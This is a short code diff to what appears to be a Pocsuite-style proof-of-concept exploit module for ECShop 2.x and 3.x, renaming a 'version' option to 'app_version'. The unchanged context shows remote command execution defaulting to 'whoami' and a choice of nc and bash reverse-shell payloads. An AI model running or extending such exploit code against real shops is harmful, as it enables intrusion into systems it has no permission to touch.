@@ -39,7 +39,7 @@ class DemoPOC(POCBase):
     def _options(self):
         o = OrderedDict()
         o["command"] = OptString("whoami")
-        o["version"] = OptItems(['2.x', '3.x', 'Auto'], selected="Auto")
+        o["app_version"] = OptItems(['2.x', '3.x', 'Auto'], selected="Auto")
         payload = {
             "nc": REVERSE_PAYLOAD.NC,
             "bash": REVERSE_PAYLOAD.BASH,
@@ -83,7 +83,7 @@ class DemoPOC(POCBase):
         # ECShop 3.x payload
         ec3payload = self.gen_ec3payload(phpcode)
 
-        option = self.get_option("version")
+        option = self.get_option("app_version")
 
         if option == "Auto":
             payloads = [(ec2payload, '2.x'), (ec3payload, '3.x')]
@@ -137,7 +137,7 @@ class DemoPOC(POCBase):
         # ECShop 3.x payload
 
         ec3payload = self.gen_ec3payload(phpcode)
-        option = self.get_option("version")
+        option = self.get_option("app_version")
         if option == "Auto":
             payloads = [(ec2payload, '2.x'), (ec3payload, '3.x')]
         elif option == "2.x":
